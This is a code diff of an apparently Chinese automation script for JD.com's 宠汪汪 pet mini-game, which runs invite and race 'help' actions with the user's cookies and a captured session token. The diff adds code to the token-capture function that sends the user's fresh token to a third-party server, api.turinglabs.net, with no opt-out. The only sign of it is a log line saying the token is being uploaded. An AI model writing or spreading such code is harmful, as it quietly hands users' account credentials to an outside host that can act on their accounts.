@@ -1,6 +1,6 @@
 /**
  宠汪汪邀请助力与赛跑助力脚本，感谢github@Zero-S1提供帮助
- 更新时间：2020-11-16（宠汪汪助力更新Token的配置正则表达式已改）
+ 更新时间：2020-11-29（宠汪汪助力更新Token的配置正则表达式已改）
 
  token时效很短，几个小时就失效了,闲麻烦的放弃就行
  每天拿到token后，可一次性运行完毕即可。
@@ -42,8 +42,6 @@ const JD_BASE_API = `https://draw.jdfcloud.com//pet`;
 let invite_pins = ["jd_7da9924d92a2c"];
 //给下面好友赛跑助力
 let run_pins = ["jd_7da9924d92a2c"];
-// $.LKYLToken = '76fe7794c475c18711e3b47185f114b5' || $.getdata('jdJoyRunToken');
-$.LKYLToken = $.getdata('jdJoyRunToken');
 //Node.js用户请在jdCookie.js处填写京东ck;
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 //IOS等用户直接用NobyDa的jd cookie
@@ -102,10 +100,8 @@ if ($.isNode()) {
 }
 
 //获取来客有礼Token
-let count = 0,
-    countFlag = 0;
-
-function getToken() {
+let count = 0;
+async function getToken() {
     const url = $request.url;
     $.log(`${$.name}url\n${url}\n`)
     if (isURL(url, /^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/addUser\?code=/)) {
@@ -121,6 +117,15 @@ function getToken() {
                 count = 0;
                 $.setdata(`${count}`, 'countFlag');
                 $.msg($.name, '更新Token: 成功🎉', ``);
+                console.log(`开始上传Token`)
+                await $.http.get({ url: `http://api.turinglabs.net/api/v1/jd/joy/create/${LKYLToken}/` }).then((resp) => {
+                    if (resp.statusCode === 200) {
+                        let { body } = resp;
+                        console.log(`Token提交结果:${body}`)
+                        body = JSON.parse(body);
+                        console.log(`${body.message}`)
+                    }
+                });
             }
             $.setdata(LKYLToken, 'jdJoyRunToken');
         }
@@ -148,7 +153,6 @@ function getToken() {
     }
 }
 async function main() {
-    console.log(`打印token \n${$.getdata('jdJoyRunToken')}\n`)
     if (!cookiesArr[0]) {
         $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', { "open-url": "https://bean.m.jd.com/" });
         return;
